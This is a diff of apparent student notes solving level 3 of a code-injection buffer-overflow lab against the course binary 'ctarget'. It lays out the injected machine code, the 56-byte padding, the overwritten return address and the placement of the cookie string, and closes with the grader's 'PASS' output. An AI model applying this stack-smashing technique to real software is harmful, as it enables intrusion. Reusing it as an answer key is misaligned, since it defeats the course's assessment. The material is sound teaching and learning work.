@@ -44,7 +44,30 @@ input3.o:     file format elf64-x86-64
 Disassembly of section .text:
 
 0000000000000000 <.text>:
-   0:   48 c7 07 56 db eb 76    movq   $0x76ebdb56,(%rdi)
+   0:   48 c7 c7 c8 a0 61 55    movq   $0x5561a0c8,(%rdi)
    7:   68 a2 19 40 00          pushq  $0x4019a2
    c:   c3                      retq
 [osbe@cdmcscspprd01 target17]$ emacs input3.txt
+
+//Our input3 should end up looking as follows
+48 c7 c7 c8 a0 61 55 68 // Movq and push instruction
+a2 19 40 00 c3 00 00 00 // Finish push instruction and return
+00 00 00 00 00 00 00 00 // Padding up to 56 Bytes
+00 00 00 00 00 00 00 00 // Padding up to 56 Bytes
+00 00 00 00 00 00 00 00 // Padding up to 56 Bytes
+00 00 00 00 00 00 00 00 // Padding up to 56 Bytes
+00 00 00 00 00 00 00 00 // Padding up to 56 Bytes
+88 a0 61 55 00 00 00 00 // Address to the beginning of our exploit input
+37 36 65 62 64 62 35 36 // Byte by byte ascii codes for each char of our cookie address without 0x
+
+//NOTE: If you attempt to write in the ascii codes for our cookie string in the middle of the padding
+//Your attempt will fail as it will keep reading up through the return address. 
+//Can only be placed at the return address +8
+
+[osbe@cdmcscspprd01 target17]$ ./hex2raw < input3?.txt >input3-raw?.txt
+[osbe@cdmcscspprd01 target17]$ ./ctarget <input3-raw?.txt
+Cookie: 0x76ebdb56
+Type string:Touch3!: You called touch3("76ebdb56")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
